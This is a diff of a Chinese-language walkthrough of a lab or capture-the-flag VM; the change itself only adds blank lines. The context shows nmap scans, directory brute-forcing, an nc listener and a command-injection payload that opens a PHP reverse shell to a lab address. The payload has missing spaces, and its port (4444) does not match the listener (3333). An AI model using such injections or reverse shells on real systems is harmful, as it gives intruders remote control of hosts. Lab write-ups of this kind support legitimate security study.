@@ -6,6 +6,7 @@
 nmap掃描虛擬機ip及port，發現位於33447/tcp是開啟狀態，service為http
 
 `$ sudo nmap -sP 172.16.71.0/24`
+
 `$ sudo nmap -p1-65535 -sV 172.16.71.208`
 ### Step 2
 利用DirBuster暴力掃目錄，從cake.php中找出/Magic_Box
@@ -15,6 +16,7 @@ nmap掃描虛擬機ip及port，發現位於33447/tcp是開啟狀態，service為
 監聽3333port
 
 `$ nc -l 3333`
+
 用php反彈shell成功，最後payload:
 
 `172.16.71.1;php-r '$sock=fsockopen("172.16.71.1",4444);exec("/bin/sh-i<&3 >&3 2>&3");'`
